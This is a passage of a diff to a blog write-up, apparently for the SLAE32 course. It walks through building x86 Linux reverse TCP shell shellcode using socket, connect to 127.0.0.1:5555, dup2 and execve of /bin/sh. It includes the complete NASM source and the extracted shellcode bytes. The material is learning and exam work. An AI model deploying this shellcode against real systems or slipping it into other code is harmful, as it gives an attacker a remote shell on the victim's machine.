@@ -85,3 +85,264 @@ For the Reverse TCP Shell, we need to following `syscalls`:
 3) Dup2: Manages `stdin`, `stdout` and `stderr` for the file descriptor. This is necessary for input and output redirection.
 4) Execve: Execute a command (`/bin/sh` to spawn a shell)
 
+## Syscall + Function Calls
+
+First, we need to collect arguemnts for `socketcall()` as well as other `syscalls`. 
+
+> **NOTE**: socketcall() is a common kernel entry point for the socket system calls.
+
+By querying `/usr/include/i386-linux-gnu/asm/unistd_32.h`, we can collect the following args for the `syscalls`:
+
+```console
+#define __NR_socketcall	102 --> Hex: 0x66
+#define __NR_connect 362    --> Hex: 0x16a
+#define __NR_dup2	63  --> Hex: 0x3f
+#define __NR_execve	11  --> Hex: 0xb
+```
+
+Additionally, by looking at `/usr/include/linux/net.h`, we can also obtain args for the function calls:
+
+```console
+root@kali:~/Documents/SLAE32/Exam/Assignement1# cat /usr/include/linux/net.h | grep SYS
+#define SYS_SOCKET	1		/* sys_socket(2)	*/
+#define SYS_BIND	2		/* sys_bind(2)		*/
+#define SYS_CONNECT	3		/* sys_connect(2)	*/
+#define SYS_LISTEN	4		/* sys_listen(2)	*/
+#define SYS_ACCEPT	5		/* sys_accept(2)	*/
+#define SYS_GETSOCKNAME	6		/* sys_getsockname(2)	*/
+#define SYS_GETPEERNAME	7		/* sys_getpeername(2)	*/
+#define SYS_SOCKETPAIR	8		/* sys_socketpair(2)	*/
+#define SYS_SEND	9		/* sys_send(2)		*/
+#define SYS_RECV	10		/* sys_recv(2)		*/
+#define SYS_SENDTO	11		/* sys_sendto(2)	*/
+#define SYS_RECVFROM	12		/* sys_recvfrom(2)	*/
+#define SYS_SHUTDOWN	13		/* sys_shutdown(2)	*/
+#define SYS_SETSOCKOPT	14		/* sys_setsockopt(2)	*/
+#define SYS_GETSOCKOPT	15		/* sys_getsockopt(2)	*/
+#define SYS_SENDMSG	16		/* sys_sendmsg(2)	*/
+#define SYS_RECVMSG	17		/* sys_recvmsg(2)	*/
+#define SYS_ACCEPT4	18		/* sys_accept4(2)	*/
+#define SYS_RECVMMSG	19		/* sys_recvmmsg(2)	*/
+#define SYS_SENDMMSG	20		/* sys_sendmmsg(2)	*/
+```
+
+## Initialization
+
+First, let's zero out some of the registers we are going to use:
+
+```s
+global _start
+
+section		.text
+
+_start:
+
+xor eax, eax
+xor ebx, ebx
+xor ecx, ecx
+xor edx, edx
+```
+
+## 1) Socket()
+
+Let's create the `socket()` shellcode:
+
+```s
+; 1) Socket Creation
+
+mov al, 0x66		; #define __NR_socketcall 102	--> Hex: 0x66
+mov bl, 0x1		; #define SYS_SOCKET 1
+push edx		; int protocol = 0
+push ebx		; int SOCK_STREAM = 1
+push 0x2		; int AF_INET = 2
+mov ecx, esp		; Move stack pointer to ECX
+int 0x80		; Execute SYS_SOCKET
+mov edi, eax		; Save the sockfd to EDI
+```
+
+### Address struct
+
+Let's create the address `struct` shellcode:
+
+```s
+push edx		; NULL Padding
+push edx		; NULL Padding
+
+xor eax, eax        ; Zero out EAX
+; The return address 127.0.0.1 contains null-bytes which would break our shellcode. 
+; We can circumvent this by subtracting 1.1.1.1 from 128.1.1.2.
+
+mov eax, 0x02010180     ; 2.1.1.128 (*Little-Endian)
+sub eax, 0x01010101     ; Subtract 1.1.1.1 
+push eax        ; sin_addr = 127.0.0.1
+push word 0xb315		; port = 5555 (*Little-Endian)
+push word 0x2 		; int AF_INET = 2
+mov esi, esp	; Move stack pointer to ESI
+```
+
+
+## 2) Connect()
+
+Let's create the address `connect()` shellcode:
+
+```s
+; 2) Connect
+
+xor eax, eax        ; Zero out EAX
+xor ebx, ebx        ; Zero out EBX
+mov al, 0x66		; socketcall = 102
+mov bl, 0x3		; #define SYS_CONNECT	3
+push 0x10		; sizeof(addr) = 10
+push esi		; ESI = Server Address stuct
+push edi		; EDI = sockfd
+mov ecx, esp		; Move stack pointer to ECX
+int 0x80		; Execute SYS_BIND
+```
+
+
+## 3) Dup2()
+
+Let's create the `dup2()` shellcode:
+
+```s
+; 3) Dup2 - Input and Output Redriection
+
+xor ecx, ecx		; Zero out
+mov cl, 0x3		; Set the counter 
+
+loop:
+xor eax, eax		; Zero out
+mov al, 0x3f		; #define __NR_dup2	63  --> Hex: 0x3f
+mov ebx, edi		; New sockfd
+dec cl		; Decrementing the counter by 1
+int 0x80		
+
+jnz loop		; Jump back to the beginning of the loop until CL is set to zero flag
+```
+
+
+## Execve()
+
+Let's create the `execve()` shellcode:
+
+```s
+; 4) Execve
+
+push edx		; NULL
+push 0x68732f6e		; "hs/n"  <-- //bin/sh
+push 0x69622f2f		; "ib//"
+mov ebx, esp		; Move stack pointer to EBX
+push edx		; NULL terminator
+push ebx
+mov ecx, esp		; Move stack pointer to ECX
+mov al, 0xb		; #define __NR_execve	11  --> Hex: 0xb
+int 0x80		; Execute SYS_EXECVE
+```
+
+
+## Final Shellcode (reverse-tcp-shell.nasm)
+
+Let's put everything togeter and test the shellcode.
+
+```s
+global _start
+
+section		.text
+
+_start:
+
+xor eax, eax
+xor ebx, ebx
+xor ecx, ecx
+xor edx, edx
+
+; 1) Socket Creation
+mov al, 0x66		; #define __NR_socketcall 102	--> Hex: 0x66
+mov bl, 0x1		; #define SYS_SOCKET 1
+push edx		; int protocol = 0
+push ebx		; int SOCK_STREAM = 1
+push 0x2		; int AF_INET = 2
+mov ecx, esp		; Move stack pointer to ECX
+int 0x80		; Execute SYS_SOCKET
+mov edi, eax		; Save the sockfd to EDI
+
+; Address struct
+push edx		; NULL Padding
+push edx		; NULL Padding
+xor eax, eax        ; Zero out EAX
+; The return address 127.0.0.1 contains null-bytes which would break our shellcode. 
+; We can circumvent this by subtracting 1.1.1.1 from 128.1.1.2.
+mov eax, 0x02010180     ; 2.1.1.128 (*Little-Endian)
+sub eax, 0x01010101     ; Subtract 1.1.1.1 
+push eax        ; sin_addr = 127.0.0.1
+push word 0xb315		; port = 5555 (*Little-Endian)
+push word 0x2 		; int AF_INET = 2
+mov esi, esp	; Move stack pointer to ESI
+
+; 2) Connect
+xor eax, eax        ; Zero out EAX
+xor ebx, ebx        ; Zero out EBX
+mov al, 0x66		; socketcall = 102
+mov bl, 0x3		; #define SYS_CONNECT	3
+push 0x10		; sizeof(addr) = 10
+push esi		; ESI = Server Address stuct
+push edi		; EDI = sockfd
+mov ecx, esp		; Move stack pointer to ECX
+int 0x80		; Execute SYS_BIND
+
+; 3) Dup2 - Input and Output Redriection
+xor ecx, ecx		; Zero out
+mov cl, 0x3		; Set the counter 
+
+loop:
+xor eax, eax		; Zero out
+mov al, 0x3f		; #define __NR_dup2	63  --> Hex: 0x3f
+mov ebx, edi		; New sockfd
+dec cl		; Decrementing the counter by 1
+int 0x80		
+
+jnz loop		; Jump back to the beginning of the loop until CL is set to zero flag
+
+; 4) Execve
+push edx		; NULL
+push 0x68732f6e		; "hs/n"  <-- //bin/sh
+push 0x69622f2f		; "ib//"
+mov ebx, esp		; Move stack pointer to EBX
+push edx		; NULL terminator
+push ebx
+mov ecx, esp		; Move stack pointer to ECX
+mov al, 0xb		; #define __NR_execve	11  --> Hex: 0xb
+int 0x80		; Execute SYS_EXECVE
+```
+
+
+# Compile
+
+I created a simple compiler [compilerX86.py](https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py). Using this we can:
+* Compile `reverse-tcp-shell.nasm` to a binary
+* Extract shellcode from the binary to create `shellcode.c`
+* Compile `shellcode.c` to a binary using `gcc`
+
+```console
+root@kali:~/Documents/SLAE32/Exam/Assignement2# python compilerX86.py -f reverse-tcp-shell
+ 
+  ________  ________  _____ ______   ________  ___  ___       _______   ________     ___    ___ ________  ________         
+ |\   ____\|\   __  \|\   _ \  _   \|\   __  \|\  \|\  \     |\  ___ \ |\   __  \   |\  \  /  /|\   __  \|\   ____\        
+ \ \  \___|\ \  \|\  \ \  \\\__\ \  \ \  \|\  \ \  \ \  \    \ \   __/|\ \  \|\  \  \ \  \/  / | \  \|\  \ \  \___|      
+  \ \  \    \ \  \\\  \ \  \\|__| \  \ \   ____\ \  \ \  \    \ \  \_|/_\ \   _  _\  \ \    / / \ \   __  \ \  \____   
+   \ \  \____\ \  \\\  \ \  \    \ \  \ \  \___|\ \  \ \  \____\ \  \_|\ \ \  \\  \|  /     \/   \ \  \|\  \ \  ___  \ 
+    \ \_______\ \_______\ \__\    \ \__\ \__\    \ \__\ \_______\ \_______\ \__\\ _\ /  /\   \    \ \_______\ \_______\ 
+     \|_______|\|_______|\|__|     \|__|\|__|     \|__|\|_______|\|_______|\|__|\|__/__/ /\ __\    \|_______|\|_______|    
+                                                                                    |__|/ \|__|     [bigb0ss] v1.0         
+
+[+] Assemble: reverse-tcp-shell.nasm
+[+] Linking: reverse-tcp-shell.o
+[+] Shellcode: "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x31\xc0\xb8\x80\x01\x01\x02\x2d\x01\x01\x01\x01\x50\x66\x68\x15\xb3\x66\x6a\x02\x89\xe6\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x6a\x10\x56\x57\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
+[+] Creating File: shellcode.c
+[+] Compiling Executable: shellcode
+[+] Enjoy!
+```
+
+![image](/assets/img/post/slae32/assignment2/03.png)
+
+
